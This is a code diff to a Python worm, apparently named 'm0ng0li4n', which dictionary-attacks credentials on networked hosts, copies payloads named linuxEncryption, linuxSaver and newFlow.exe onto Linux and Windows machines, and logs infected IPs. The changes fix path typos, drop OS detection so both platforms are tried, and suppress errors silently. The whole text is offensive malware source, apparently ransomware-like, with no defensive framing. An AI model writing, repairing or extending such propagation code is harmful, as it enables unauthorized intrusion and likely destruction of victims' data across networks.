@@ -22,8 +22,7 @@ def doWindowsRunPayload(handle):
 
 def doLinuxWithLinux(handle, user, password, ip):
 
-	handle.makedirs('/tmp/m0ng0li4n')
-	handle.put('/tmp/m0n0gli4n/ips.dat', '/tmp/m0n0gli4n/ips.dat')
+	handle.put('/tmp/m0ng0li4n/ips.dat', '/tmp/m0ng0li4n/ips.dat')
 	handle.put('/tmp/m0ng0li4n/linuxEncryption', '/tmp/m0ng0li4n/linuxEncryption')
 	handle.put('/tmp/m0ng0li4n/linuxSaver','/tmp/m0ng0li4n/linuxSaver')
 	handle.put('/tmp/m0ng0li4n/newFlow', '/tmp/m0ng0li4n/newFlow')
@@ -42,8 +41,7 @@ def doLinuxWithLinux(handle, user, password, ip):
 
 def doWindowsWithLinux(handle, user, password, ip):
 
-	handle.makedirs('C:\\Users\\' + user +"\\m0ng0li4n")
-	handle.put('/tmp/m0n0gli4n/ips.dat', 'C:\\Users\\'+user+'\\m0n0gli4n\\ips.dat')
+	handle.put('/tmp/m0ng0li4n/ips.dat', 'C:\\Users\\'+user+'\\m0ng0li4n\\ips.dat')
 	handle.put('/tmp/m0ng0li4n/newFlow', 'C:\\Users\\'+user+'\\m0ng0li4n\\newFlow')
 	handle.put('/tmp/m0ng0li4n/newFlow.exe', 'C:\\Users\\'+user+'\\m0ng0li4n\\newFlow.exe')
 	handle.put('/tmp/m0ng0li4n/linuxEncryption', 'C:\\Users\\'+user+'\\m0ng0li4n\\linuxEncryption')
@@ -59,8 +57,7 @@ def doWindowsWithLinux(handle, user, password, ip):
 
 def doLinuxWithWindows(handle, user, password, ip):
 
-	handle.makedirs('/tmp/m0ng0li4n')
-	handle.put('C:\\Users\\'+user+'\\m0n0gli4n\\ips.dat', '/tmp/m0n0gli4n/ips.dat')
+	handle.put('C:\\Users\\'+user+'\\m0ng0li4n\\ips.dat', '/tmp/m0ng0li4n/ips.dat')
 	handle.put('C:\\Users\\'+user+'\\m0ng0li4n\\newFlow', '/tmp/m0ng0li4n/newFlow')
 	handle.put('C:\\Users\\'+user+'\\m0ng0li4n\\newFlow.exe', '/tmp/m0ng0li4n/newFlow.exe')
 	handle.put('C:\\Users\\'+user+'\\m0ng0li4n\\linuxEncryption', '/tmp/m0ng0li4n/linuxEncryption')
@@ -76,8 +73,7 @@ def doLinuxWithWindows(handle, user, password, ip):
 
 def doWindowsWithWindows(handle, user, password, ip):
 
-	handle.makedirs('C:\\Users\\' + user +"\\m0ng0li4n")
-	handle.put('C:\\Users\\'+user+'\\m0n0gli4n\\ips.dat', 'C:\\Users\\'+user+'\\m0n0gli4n\\ips.dat')
+	handle.put('C:\\Users\\'+user+'\\m0ng0li4n\\ips.dat', 'C:\\Users\\'+user+'\\m0ng0li4n\\ips.dat')
 	handle.put('C:\\Users\\'+user+'\\m0ng0li4n\\newFlow', 'C:\\Users\\'+user+'\\m0ng0li4n\\newFlow')
 	handle.put('C:\\Users\\'+user+'\\m0ng0li4n\\newFlow.exe', 'C:\\Users\\'+user+'\\m0ng0li4n\\newFlow.exe')
 	handle.put('C:\\Users\\'+user+'\\m0ng0li4n\\linuxEncryption', 'C:\\Users\\'+user+'\\m0ng0li4n\\linuxEncryption')
@@ -105,52 +101,55 @@ def main():
 				ips.remove(ip)
 
 			for ip in ips:
-				os = getos(ip)
 				try:
-					if os == 'Linux':
-						handle, user, password = dict_attack.attack(ip)
-						t = threading.Thread(target=doLinuxWithWindows, args=(handle, user, password, ip), daemon=False)
-						t.start()
-						f.write(ip + '\n')
-						break
-					elif os == 'AVtech' or  os == 'Windows':
-						handle, user, password = dict_attack.attack(ip)
-						t = threading.Thread(target=doWindowsWithWindows, args=(handle, user, password,ip), daemon=False)
-						t.start()
-						f.write(ip + '\n')
-						break
-					else:
-						pass
+					handle, user, password = dict_attack.attack(ip)
+					handle.makedirs('/tmp/m0ng0li4n')
+					t = threading.Thread(target=doLinuxWithWindows, args=(handle, user, password, ip), daemon=False)
+					t.start()
+					f.write(ip + '\n')
+					break
 				except:
-					print('Skipping',ip)
+					pass
+
+				try:
+					handle, user, password = dict_attack.attack(ip)
+					handle.makedirs('C:\\Users\\'+user+'\\m0ng0li4n')
+					t = threading.Thread(target=doWindowsWithWindows, args=(handle, user, password,ip), daemon=False)
+					t.start()
+					f.write(ip + '\n')
+					break
+				except:
+					pass
+
 	elif host_os == 'Linux':
 		ips = getIP(host_os)
 		currentUser = os.getlogin()
-		with open('/tmp/m0n0gli4n/ips.dat', 'at+') as f:
+		with open('/tmp/m0ng0li4n/ips.dat', 'at+') as f:
 			affectedIPs = f.readlines()
 			for ip in affectedIPs:
 				ip = ip.strip()
 				ips.remove(ip)
 
 			for ip in ips:
-				os = getos(ip)
 				try:
-					if os == 'Linux':
-						handle, user, password = dict_attack.attack(ip)
-						t = threading.Thread(target=doLinuxWithLinux, args=(handle, user, password, ip), daemon=False)
-						t.start()
-						f.write(ip + '\n')
-						break
-					elif os == 'AVtech' or os == 'Windows':
-						handle, user, password = dict_attack.attack(ip)
-						t = threading.Thread(target=doWindowsWithLinux, args=(handle, user, password, ip), daemon=False)
-						t.start()
-						f.write(ip + '\n')
-						break
-					else:
-						pass
+					handle, user, password = dict_attack.attack(ip)
+					handle.makedirs('/tmp/m0ng0li4n')
+					t = threading.Thread(target=doLinuxWithWindows, args=(handle, user, password, ip), daemon=False)
+					t.start()
+					f.write(ip + '\n')
+					break
 				except:
-					print('Skipping',ip)
+					pass
+
+				try:
+					handle, user, password = dict_attack.attack(ip)
+					handle.makedirs('C:\\Users\\'+user+'\\m0ng0li4n')
+					t = threading.Thread(target=doWindowsWithWindows, args=(handle, user, password,ip), daemon=False)
+					t.start()
+					f.write(ip + '\n')
+					break
+				except:
+					pass
 	else:
 		pass
 
